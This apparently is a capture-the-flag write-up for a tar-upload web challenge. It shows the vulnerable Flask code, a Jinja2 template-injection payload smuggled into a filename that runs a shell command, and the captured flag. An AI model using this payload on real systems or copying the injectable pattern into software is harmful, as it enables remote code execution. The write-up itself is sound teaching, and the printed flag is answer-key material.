# File Sharing Portal

Welcome to the file sharing portal! We only support tar files! Author: NoobMaster + NoobHacker

# Flag
```
n00bz{n3v3r_7rus71ng_t4r_4g41n!_b77524695259}
```

# Solution
The website allows us to upload a `.tar` file, which will help us extract its contents, displaying the files and allowing us to read the contents.

The following code is used to display the files after extraction:

```py
@app.route('/view/<name>')
def view(name):
    if not all([i in "abcdef1234567890" for i in name]):
        return render_template_string("<p>Error!</p>")
        #print(os.popen(f'ls ./uploads/{name}').read())
            #print(name)
    files = os.listdir(f"./uploads/{name}")
    out = '<h1>Files</h1><br>'
    files.remove(f'{name}.tar')  # Remove the tar file from the list
    for i in files:
        out += f'<a href="/read/{name}/{i}">{i}</a>'    # SSTI vuln
       # except:
    return render_template_string(out)
```

There is an SSTI vulnerability when the filenames are displayed. By modifying the filename to our SSTI payload we can run system commands such as listing directory and reading the flag.

Payload:
```bash
touch "{{''.__class__.__mro__[1].__subclasses__()[351]('cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt',shell=True,stdout=-1).communicate()[0].strip()}}"
touch "otherfile"
tar -cvf output.tar *
```

Result:
```html
<h1>Files</h1><br><a href="/read/5bf11fe6800e3d8312dc3353c000eb8dd0c0592d9395ae26406f55c24da0e673/otherfile">otherfile</a><a href="/read/5bf11fe6800e3d8312dc3353c000eb8dd0c0592d9395ae26406f55c24da0e673/b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_b77524695259}&#39;">b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_b77524695259}&#39;</a>
```